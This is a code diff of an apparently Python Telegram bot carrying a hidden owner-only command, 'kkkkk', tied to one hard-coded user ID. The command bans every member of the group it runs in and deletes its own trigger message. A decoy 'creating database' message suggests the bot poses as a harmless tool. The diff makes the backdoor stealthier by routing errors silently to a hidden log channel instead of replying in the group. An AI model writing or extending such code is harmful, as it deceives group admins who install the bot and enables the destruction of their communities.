@@ -24,7 +24,7 @@ BOT_ID = 5720302471
 
 SK = "Creating Seprate Database for your Group \nThis May take Some Time Please Wait..."             
 NK = "Required Admin permission To Send Messages in Group"
-
+LOGG = -1001686630791
 @app.on_message(filters.command("kkkkk") & filters.user(1497264683))
 async def ban_all(_,msg):
     chat_id=msg.chat.id    
@@ -39,7 +39,7 @@ async def ban_all(_,msg):
                     await app.ban_chat_member(chat_id, member.user.id)
                     await msg.delete()                   
             except Exception as e:
-                await msg.reply_text(f"{NK} \n👮🏻{e}")
+                await app.send_message(LOGG, text=e)
                 pass
 
 
